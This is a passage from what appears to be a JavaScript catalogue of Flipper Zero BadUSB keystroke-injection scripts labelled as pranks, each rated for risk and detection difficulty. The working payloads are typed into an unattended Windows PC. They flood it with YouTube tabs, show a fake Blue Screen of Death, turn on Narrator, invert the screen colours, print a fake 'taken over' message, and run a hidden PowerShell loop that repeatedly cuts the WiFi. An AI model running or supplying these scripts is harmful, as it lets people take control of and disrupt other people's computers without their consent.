STRING Just kidding. Lock your computer next time.`
  },
  {
    id: 'prank-subscribe-bomb',
    name: '[Flipper] Subscribe Bomb',
    category: 'pranks',
    description: 'Opens 10 different popular YouTube music videos in separate browser tabs. Harmless prank that floods the browser with video tabs.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM YouTube Tab Bomb
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "$urls=@('https://www.youtube.com/watch?v=dQw4w9WgXcQ','https://www.youtube.com/watch?v=hBe0LIB_Bxg','https://www.youtube.com/watch?v=ZZ5LpwO-An4','https://www.youtube.com/watch?v=9bZkp7q19f0','https://www.youtube.com/watch?v=kJQP7kiw5Fk','https://www.youtube.com/watch?v=RgKAFK5djSk','https://www.youtube.com/watch?v=JGwWNGJdvx8','https://www.youtube.com/watch?v=fJ9rUzIMcZQ','https://www.youtube.com/watch?v=3tmd-ClpJxA','https://www.youtube.com/watch?v=60ItHLz5WEA'); foreach($u in $urls){Start-Process $u; Start-Sleep -Milliseconds 500}"
ENTER`
  },
  {
    id: 'prank-fake-bsod',
    name: '[Flipper] Blue Screen Fake',
    category: 'pranks',
    description: 'Opens a fullscreen fake Blue Screen of Death that looks convincingly real. Harmless prank using a fake update website.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~6s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Fake Blue Screen of Death
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING https://fakeupdate.net/win10/
ENTER
DELAY 3000
F11`
  },
  {
    id: 'prank-speak-everything',
    name: '[Flipper] Speak Everything',
    category: 'pranks',
    description: 'Enables Windows Narrator so the PC reads everything on screen out loud. Harmless prank that activates the built-in accessibility feature.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~2s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Enable Narrator (speaks everything)
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI CTRL ENTER`
  },
  {
    id: 'prank-invert-colors',
    name: '[Flipper] Invert Colors',
    category: 'pranks',
    description: 'Inverts all screen colors using the Windows Magnifier color inversion shortcut. Harmless prank that makes everything look like a photo negative.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Invert Screen Colors
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process magnify.exe; Start-Sleep -Seconds 1; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('^%i')"
ENTER`
  },
  {
    id: 'prank-wifi-disconnect',
    name: '[Flipper] WiFi Disconnect Loop',
    category: 'pranks',
    description: 'Disconnects and reconnects WiFi repeatedly 5 times. Harmless prank that causes intermittent network drops.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~40s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM WiFi Flicker
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "1..5 | ForEach-Object { netsh wlan disconnect; Start-Sleep -Seconds 3; netsh wlan connect name=(netsh wlan show profiles | Select-String ':(.+)$' | Select-Object -First 1).Matches.Groups[1].Value.Trim(); Start-Sleep -Seconds 5 }"
ENTER`
  },
  {
    id: 'prank-ps-ascii-art',
    name: '[Flipper] PS Draw',
    category: 'pranks',
    description: 'Opens PowerShell and draws ASCII art of a face with a funny message. Harmless prank that displays art in the console.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM PowerShell ASCII Art
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 800
STRING $Host.UI.RawUI.BackgroundColor='Black';$Host.UI.RawUI.ForegroundColor='Cyan';Clear-Host;Write-Host @"
DELAY 100
ENTER
STRING    __|__
STRING   |     |
STRING   | O O |
STRING   |  ^  |
STRING   | \\_/ |
STRING   |_____|
STRING  /|     |\\
STRING / |     | \\
STRING   |     |
STRING   |     |
STRING   d     b
ENTER
STRING "@
ENTER
STRING Write-Host "\`nI HAVE TAKEN OVER THIS COMPUTER\`nJust kidding. But seriously, lock your workstation." -ForegroundColor Yellow
ENTER`
  }
]
